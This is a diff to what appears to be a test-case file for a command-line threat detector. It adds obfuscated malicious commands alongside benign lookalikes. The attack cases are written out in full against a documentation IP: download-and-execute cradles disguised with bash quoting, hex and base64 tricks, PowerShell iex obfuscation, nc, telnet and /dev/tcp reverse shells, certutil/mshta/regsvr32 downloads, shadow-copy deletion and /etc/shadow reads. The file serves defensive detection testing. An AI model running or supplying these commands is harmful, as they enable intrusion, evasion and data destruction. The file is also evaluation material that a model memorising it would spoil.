@@ -465,3 +465,84 @@ HOLDOUT_BENIGN: list[Case] = [
     Case("h-portainer-sock", "docker run -d -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer-ce", "notable", "portainer docs"),
     Case("h-rundll32-ordinal-run", r"rundll32.exe C:\Windows\System32\shell32.dll,#61", "notable", "admin"),
 ]
+
+
+# ── Edge set: obfuscation and restyling ──────────────────────────────────────
+# Each case is an attack already represented above, rewritten with one
+# shell-level trick. First scored before any rule was written for it.
+
+EDGE_ATTACKS: list[Case] = [
+    # bash word-splitting / quoting tricks
+    Case("e-bash-ifs", "curl${IFS}-fsSL${IFS}http://203.0.113.7/i.sh|bash", "malicious", "T1027 ${IFS} spacing"),
+    Case("e-bash-empty-quotes", "c''url -s http://203.0.113.7/i.sh | b\"\"ash", "malicious", "T1027 empty-quote splitting"),
+    Case("e-bash-backslash", r"w\get -qO- http://203.0.113.7/i.sh | s\h", "malicious", "T1027 backslash escapes"),
+    Case("e-bash-var-assembly", "a=cu;b=rl;$a$b -s http://203.0.113.7/i.sh | sh", "malicious", "T1027 variable assembly"),
+    Case("e-bash-glob-shadow", "/???/c?t /e??/sh?dow", "suspicious", "T1027 glob path"),
+    Case("e-bash-ansi-c-hex", "$'\\x63\\x75\\x72\\x6c' -s http://203.0.113.7/i.sh | sh", "malicious", "T1027 ANSI-C quoting"),
+    Case("e-bash-process-subst", "bash <(curl -s http://203.0.113.7/i.sh)", "malicious", "T1059.004"),
+    Case("e-sh-c-wget-subst", "sh -c \"$(wget -qO- http://203.0.113.7/i.sh)\"", "malicious", "T1059.004"),
+    Case("e-xxd-pipe-sh", "echo 6375726c202d7320687474703a2f2f3230332e302e3131332e372f692e7368207c207368 | xxd -r -p | sh", "malicious", "T1027 hex pipe"),
+    Case("e-printf-hex-sh", "printf '\\x69\\x64\\x3b\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77' | sh", "suspicious", "T1027 printf hex"),
+    Case("e-base64-here-string", "bash -c \"$(base64 -d <<< " + _b64("curl -s http://203.0.113.7/i.sh | sh") + ")\"", "malicious", "T1027"),
+    Case("e-openssl-b64-sh", "echo " + _b64("curl -s http://203.0.113.7/i.sh | sh") + " | openssl base64 -d | sh", "malicious", "T1027"),
+    Case("e-python-b64-oneliner", "python3 -c \"import base64,os;os.system(base64.b64decode('" + _b64("curl -s http://203.0.113.7/i.sh | sh") + "').decode())\"", "malicious", "T1059.006"),
+    Case("e-nc-c-sh", "nc 203.0.113.7 4444 -c sh", "malicious", "T1059.004"),
+    Case("e-telnet-pipe-sh", "telnet 203.0.113.7 4444 | /bin/sh | telnet 203.0.113.7 4445", "malicious", "T1059.004"),
+    Case("e-exec-fd-devtcp", "exec 5<>/dev/tcp/203.0.113.7/443; cat <&5 | while read l; do $l 2>&5 >&5; done", "malicious", "T1059.004"),
+    # PowerShell
+    Case("e-ps-enco-abbrev", "powershell -enco " + _ps_enc(_CRADLE), "malicious", "T1027.010 flag abbreviation"),
+    Case("e-ps-slash-enc", "powershell /nop /w hidden /enc " + _ps_enc(_CRADLE), "malicious", "T1027.010 slash parameters"),
+    Case("e-ps-char-array-iex", "powershell -c \"&([char[]](73,69,88)-join'') (irm http://203.0.113.7/a)\"", "malicious", "T1027"),
+    Case("e-ps-var-concat-iex", "powershell -c \"$a='IE';$b='X';&($a+$b) (irm http://203.0.113.7/a)\"", "malicious", "T1027"),
+    Case("e-ps-gcm-wildcard", "powershell -c \"&(gcm i*x) (irm http://203.0.113.7/a)\"", "malicious", "T1027 Get-Command wildcard"),
+    Case("e-ps-alias-iex", "powershell -c \"sal z iex; z (irm http://203.0.113.7/a)\"", "malicious", "T1027 Set-Alias"),
+    Case("e-ps-scriptblock-create", "powershell -c \"[scriptblock]::Create((irm http://203.0.113.7/a)).Invoke()\"", "malicious", "T1059.001"),
+    Case("e-ps-invokescript", "powershell -c \"$ExecutionContext.InvokeCommand.InvokeScript((irm http://203.0.113.7/a))\"", "malicious", "T1059.001"),
+    Case("e-ps-stdin-dash", "cmd /c \"echo irm http://203.0.113.7/a ^| iex | powershell -\"", "suspicious", "T1059.001 stdin"),
+    Case("e-ps-webrequest-content-iex", "powershell -c \"iex ([Net.WebRequest]::Create('http://203.0.113.7/a').GetResponse().GetResponseStream() | % { (New-Object IO.StreamReader $_).ReadToEnd() })\"", "malicious", "T1059.001"),
+    Case("e-ps-xmlhttp-com", "powershell -c \"$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://203.0.113.7/a',$false);$h.send();iex $h.responseText\"", "malicious", "T1059.001"),
+    Case("e-ps-reverse-string", "powershell -c \"$s='sp.a/7.311.0.302//:ptth';iex (irm (-join $s[-1..-$s.Length]))\"", "suspicious", "T1027"),
+    Case("e-ps-bxor-loop", "powershell -c \"$k=35;$b=[Convert]::FromBase64String('" + _b64("x" * 60) + "');iex (-join ($b | % { [char]($_ -bxor $k) }))\"", "suspicious", "T1027 XOR decode"),
+    # cmd / LOLBin restyling
+    Case("e-certutil-slash-flags", "certutil /urlcache /split /f http://203.0.113.7/p.exe p.exe", "malicious", "T1105 slash flags"),
+    Case("e-cmd-for-loop-exec", "cmd /v /c \"set c=certutil -urlcache -f http://203.0.113.7/p.exe %TEMP%\\p.exe&& !c!\"", "malicious", "T1027 delayed expansion"),
+    Case("e-cmd-comspec-env", "%COMSPEC% /c certutil -urlcache -f http://203.0.113.7/p.exe %TEMP%\\p.exe", "malicious", "T1059.003"),
+    Case("e-mshta-vbs-wscript-run", "mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -nop -w hidden -c iex(irm http://203.0.113.7/a)\",0)(window.close)", "malicious", "T1218.005"),
+    Case("e-regsvr32-webdav", r"regsvr32 /s /i:\\203.0.113.7@80\dav\p.sct scrobj.dll", "malicious", "T1218.010"),
+    Case("e-rundll32-sta-clsid", "rundll32.exe -sta {F5078F35-C551-11D3-89B9-0000F81FE221}", "notable", "T1218.011 COM CLSID"),
+    Case("e-wmic-fullwidth", "wmic process call create \"\uff50\uff4f\uff57\uff45\uff52\uff53\uff48\uff45\uff4c\uff4c -nop -w hidden -c iex(irm http://203.0.113.7/a)\"", "malicious", "T1027 fullwidth characters"),
+    Case("e-zero-width-split", "vssadmin del\u200bete shad\u200bows /all /quiet", "malicious", "T1027 zero-width characters"),
+    Case("e-multiline-script", "$u = 'http://203.0.113.7/a.ps1'\r\n$c = (New-Object Net.WebClient).DownloadString($u)\r\nInvoke-Expression $c", "malicious", "T1059.001 multi-line"),
+    Case("e-cmd-line-continuation", "certutil -urlcache ^\r\n -split -f ^\r\n http://203.0.113.7/p.exe p.exe", "malicious", "T1105 caret continuation"),
+    Case("e-long-junk-then-iex", "powershell -c \"$j='" + "A1b2" * 9000 + "'; iex (irm http://203.0.113.7/a)\"", "malicious", "signal after 36 KB of filler"),
+]
+
+EDGE_BENIGN: list[Case] = [
+    Case("e-word-paste-ipconfig", "ipconfig \u2013all", "low", "pasted from a document (en dash)"),
+    Case("e-smart-quotes-echo", "echo \u201chello world\u201d", "low", "pasted from a document (smart quotes)"),
+    Case("e-ps-endash-bypass-file", "powershell \u2013ExecutionPolicy Bypass \u2013File .\\build.ps1", "notable", "pasted from a document"),
+    Case("e-multiline-build", "npm ci\nnpm run build\nnpm test", "low", "multi-line dev script"),
+    Case("e-bash-ifs-benign", "IFS=, read -r a b c <<< \"1,2,3\"", "low", "IFS used normally"),
+    Case("e-glob-benign", "ls /usr/lib/python3.*/site-packages/*.dist-info", "low", "globbing"),
+    Case("e-bash-var-benign", "f=report; e=pdf; open \"$f.$e\"", "low", "variables"),
+    Case("e-printf-benign", "printf '%s\\n' one two three", "low", "printf"),
+    Case("e-xxd-benign", "xxd -p file.bin | head -n 5", "low", "hex dump"),
+    Case("e-nc-listen-benign", "nc -zv 10.0.0.5 22 443 3389", "low", "port check"),
+    Case("e-telnet-benign", "telnet mail.example.com 25", "low", "smtp check"),
+    Case("e-gcm-benign", "Get-Command *-Service", "low", "command discovery"),
+    Case("e-sal-benign", "Set-Alias ll Get-ChildItem", "low", "alias"),
+    Case("e-scriptblock-benign", "$sb = [scriptblock]::Create('Get-Date'); & $sb", "notable", "dynamic scriptblock"),
+    Case("e-char-array-benign", "[char[]](72,105) -join ''", "notable", "char array"),
+    Case("e-grep-hunting-query", "grep -i 'mimikatz\\|sekurlsa' /var/log/edr/process.log", "notable", "analyst hunting query"),
+    Case("e-findstr-hunting", "findstr /i \"vssadmin delete shadows\" C:\\Logs\\sysmon.txt", "notable", "analyst hunting query"),
+    Case("e-select-string-hunting", "Select-String -Path .\\events.csv -Pattern 'Invoke-Mimikatz','DownloadString'", "notable", "analyst hunting query"),
+    Case("e-long-benign-args", "tar -czf backup.tar.gz " + " ".join(f"dir{i}/file{i}.txt" for i in range(400)), "low", "long argument list"),
+]
+
+# Cases the pipeline is known to get wrong, kept so the gap stays visible and
+# measured. Not part of any pass/fail gate.
+KNOWN_LIMITATIONS: list[Case] = [
+    # A tool name inside a JSON body being *sent* is indistinguishable, by text
+    # alone, from the tool being invoked.
+    Case("e-json-payload", "curl -X POST https://api.example.com/log -H 'Content-Type: application/json' -d '{\"cmd\":\"powershell -enc\",\"note\":\"mimikatz detected and blocked\"}'", "notable", "telemetry containing indicator words"),
+]
